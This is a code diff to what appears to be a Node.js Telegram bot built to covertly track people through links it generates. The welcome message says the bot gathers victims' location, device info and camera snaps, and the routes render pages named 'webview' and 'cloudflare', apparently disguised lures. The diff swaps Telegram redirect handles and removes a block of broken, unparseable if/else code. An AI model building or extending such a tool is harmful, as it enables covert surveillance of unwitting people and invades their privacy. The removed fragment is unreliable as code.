@@ -30,7 +30,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/CyberSakibAlMahmud");
+res.redirect("https://t.me/SamOfficial404 ");
 }
 
          
@@ -48,7 +48,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/CyberSakibAlMahmud");
+res.redirect("https://t.me/SamOfficial404 ");
 }
 
          
@@ -73,13 +73,7 @@ reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_da
 
 bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
 }
-  if {
-    res.redirect("https://t.me/CyberSakibAlMahmud"); 
-  }
-  else  {
-  res.redirect("https://t.me/SamOfficial404 ");
-          }
-  else if(msg.text=="https://t.me/SamOfficial404 ")
+ 
 else if(msg.text=="/create"){
 createNew(chatId);
 }
